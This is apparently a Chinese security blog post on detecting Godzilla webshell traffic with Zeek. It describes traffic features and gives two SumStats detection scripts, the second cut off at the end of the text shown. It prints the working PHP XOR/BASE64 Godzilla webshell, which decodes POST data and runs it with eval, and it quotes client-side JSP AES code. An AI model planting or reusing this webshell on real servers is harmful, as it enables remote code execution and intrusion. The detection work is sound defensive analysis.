-<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>​    <strong>PHP XOR BASE64</strong> 类型的加密Shell的服务器端代码如下，其中定义了<code>encode</code>函数，用于加密或解密请求数据。由于是通过按位异或实现的加密，所以<code>encode</code>函数即可用于加密，同时也可用于解密。整个Shell的基本执行流程是：服务器接收到Godzilla发送的第一个请求后，由于此时尚未建立session，所以将POST请求数据解密后（得到的内容为Shell操作中所需要用到的相关<code>php</code>函数定义代码）存入session中，后续Godzilla只会提交相关操作对应的函数名称（如获取目录中的文件列表对应的函数为<code>getFile</code>）和相关参数，这样哥斯拉的相关操作就不需要发送大量的请求数据。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;Happy&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;bdf2e45b317c4585&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="JSP-AES-BASE64"><a href="#JSP-AES-BASE64" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><p>​    JSP WebShell 则采用了AES加密形式，AES加密的key。同样是计算密钥的MD5值，然后取其前16位用于加密。更深入的分析大家可以去参考，这并不是本文的重点。**<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析</a>**</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.shell = context;</span><br><span class="line">    <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">    <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX();</span><br><span class="line">    <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">    String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">this</span>.key);</span><br><span class="line">    <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher.init(<span class="number">1</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">            <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(<span class="keyword">this</span>.encodeCipher.doFinal(data)))).getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeCipher.doFinal(functions.base64Decode(findStr(data)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h1><p>​        结合上面的分析，传统通过静态特征的匹配方式已不在适用于Godzilla WebShell检测。不过，我们可以将多个特征进行结合实现一个检测的模型来对Godzilla PHP XOR BASE64 WebShell的检测。下面我们来列举一下检测特征：</p>
-<ol>
-<li><p><strong>频率</strong></p>
-<p>Godzilla连接WebShell的时会在一次TCP会话中发起<strong>3</strong>次HTTP POST请求。</p>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req.png" alt="image-20211206111919028"></p>
-<p>​    注意看下<code>uid</code>均为<code>CbhiAefsstFeAyCM6</code>表示是一次TCP会话请求。</p>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_uid.png" alt="image-20211206114412112"></p>
-</li>
-</ol>
-<ol start="2">
-<li><p><strong>长度</strong></p>
-<p>Godzilla虽然对传输时的<code>payload</code>进行了加密，但是初始连接时3次请求中的内容是固定的，所以通过XOR + BASE64编码后的长度是不变的。</p>
-<ul>
-<li><p>第一次请求长度（<strong>Value</strong>）：<strong>52216</strong></p>
-<p>​    Godzilla加载payload.php文件内容作为<code>payload</code>数据，其中定义了Shell功能所需的一系列函数，Godzilla第一次连接Shell时，会将这些函数定义发送给服务器并存储在session中，后续的Shell操作只需要发送函数名称以及对应的函数参数即可。</p>
-</li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/PHP-Payload.png" alt="image-20211204004016084"></p>
-<ul>
-<li><p>第一次响应长度：<strong>0</strong></p>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_resp.png" alt="image-20211204005107879"></p>
-</li>
-<li><p>第二次请求长度（<strong>Value</strong>）：<strong>28</strong></p>
-<ul>
-<li>密文： <code>CQNGDVtRLFJcUmEwNTg1FgEVRg==</code></li>
-<li>明文：<code>&#123;&#39;methodName&#39;: &#39;test&#39;&#125;</code></li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_req.png" alt="image-20211204010342657"></p>
-</li>
-<li><p>第二次响应长度：<strong>64</strong></p>
-<ul>
-<li>密文：<code>e+06ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==</code></li>
-<li>明文：<code>ok</code></li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp.png" alt="image-20211204011821599"></p>
-</li>
-<li><p>第三次请求长度（<strong>Value</strong>）：<strong>40</strong></p>
-<ul>
-<li>密文：<code>CQNGDVtRLFJcUmE5NTg1BQEScARHXAFAeFkFWw==</code></li>
-<li>明文：<code>&#123;&#39;methodName&#39;: &#39;getBasicsInfo&#39;&#125;</code></li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_req.png" alt="image-20211204012318391"><em>注：第三次响应数据包，不可作为特征提取。因为每个服务器的基础信息不一样，所以返回内容长度也不一样。</em></p>
-</li>
-</ul>
-</li>
-<li><p><strong>内容</strong></p>
-<p>有的小伙伴会奇怪，都已经加密了还能从内容上做哪些判断。其实还是可以有的，只不过并不是传统的“威胁特征”</p>
-<ul>
-<li>请求：3次请求中的key均<strong>相等</strong>，此例中为：<code>Happy</code></li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_key.png" alt="image-20211206111328799"></p>
-<ul>
-<li>响应：响应数据包中首尾各16位数值可满足MD5的提取<code>[a-z0-9]&#123;16&#125;.+[a-z0-9]&#123;16&#125;</code>，且2次响应包中的16位数值均<strong>相等</strong>；</li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp_md5.png" alt="image-20211206105322612"></p>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_resp_md5.png" alt="image-20211206110509962"></p>
-</li>
-</ol>
-<h1 id="检测模型"><a href="#检测模型" class="headerlink" title="检测模型"></a>检测模型</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/image.jpeg" alt="image-20211208151817057"></p>
-<h2 id="PHP-XOR-BASE64-1"><a href="#PHP-XOR-BASE64-1" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_PHP_XOR_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">## 使用Summary Statistics Framework（统计框架）对http请求进行测量。</span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (c?$http) &amp;&amp; (c$http?$status_code) &amp;&amp; (c$http?$method) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      ## 第一步，创建一个观察器，将数据添加到观察器中。</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ## 第二步，根据指定的观察流进行处理，此处采用计算唯一值的方式。</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  ## 第三步，创建汇总统计，以便最终对其进行处理。例：当在<span class="number">3</span>秒的时间窗内满足<span class="number">3</span>次阈值将会执行以下逻辑；</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_php_xor_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">3</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## 获取请求参数</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              ## 本例中: Happy=CQNGDVtRLFJcUmEwNTg1FgEVRg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            ## 响应体长度 &gt; <span class="number">0</span>，提取首位各<span class="number">16</span>字节并检查是否满足MD5格式</span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              ## 本例中: <span class="number">52f</span>0f23a94a8a3f0e+<span class="number">06</span>ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==<span class="number">468e329</span>e21eb39e8</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_all_ordered(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              <span class="keyword">if</span> (|server_body_md5| == <span class="number">0</span>)</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                              add md5_str_set[server_body_str];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 &gt; <span class="number">52216</span> &amp;&amp; 响应体长度 = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">52216</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">28</span> &amp;&amp; 响应体长度 = <span class="number">64</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">28</span>) &amp;&amp; (|server_body| == <span class="number">64</span>) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">40</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">40</span> )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            ## 判断<span class="number">3</span>次请求参数是否唯一</span><br><span class="line">                            ## 判断后<span class="number">2</span>次提取的MD5值是否唯一</span><br><span class="line">                            <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_PHP_XOR_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(PHP_XOR_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="JSP-AES-BASE64-1"><a href="#JSP-AES-BASE64-1" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_JSP_AES_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( c?$http &amp;&amp; c$http?$status_code &amp;&amp; c$http?$method )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">5</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, 